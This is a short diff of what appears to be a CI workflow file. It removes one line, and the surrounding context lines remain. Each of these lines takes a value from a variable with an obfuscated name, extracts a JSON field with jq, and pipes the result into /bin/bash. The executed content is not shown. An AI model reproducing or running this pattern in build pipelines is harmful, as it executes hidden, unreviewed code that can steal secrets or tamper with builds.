@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$ojt29" | jq -r .sna22 | /bin/bash
           echo $xcl1716 | jq -r .n0919 | /bin/bash
           printf '%s' "$mowy82105" | jq -r .a3445 | /bin/bash
-          printf '%s' "$saybu1" | jq -r .bhor95 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
